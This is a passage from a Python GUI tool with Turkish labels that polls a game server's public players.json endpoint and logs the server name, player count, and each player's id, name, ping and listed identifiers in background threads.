                self._log(self.mon_log,f'  Sunucu: {v.get("sv_projectName","?")}')
                self._log(self.mon_log,f'  Oyuncu: {len(players)} / {v.get("sv_maxClients","?")}')
                self._log(self.mon_log,f'  Zaman: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}')
                for x in players:
                    self._log(self.mon_log,f'  [{x.get("id","?"):>3}] {x.get("name","?"):<28} ping:{x.get("ping","?")}')
                self._log(self.mon_log,'================')
            except Exception as e:self._log(self.mon_log,f'[ERR] {e}')
        threading.Thread(target=w,daemon=True).start()

    def _mon_now(self):
        def w():
            h,p=self._mon_ip()
            if not h:return
            try:
                players=requests.get(f'http://{h}:{p}/players.json',timeout=5).json()
                self._log(self.mon_log,f'--- Oyuncular ({len(players)}) ---')
                for x in players:
                    self._log(self.mon_log,f'  [{x.get("id","?"):>3}] {x.get("name","?"):<28} ping:{x.get("ping","?")}ms')
                    for ident in x.get('identifiers',[]):
                        self._log(self.mon_log,f'        {ident}')
            except Exception as e:self._log(self.mon_log,f'[ERR] {e}')
        threading.Thread(target=w,daemon=True).start()

if __name__=="__main__":
    app=HariboTool()
    app.mainloop()
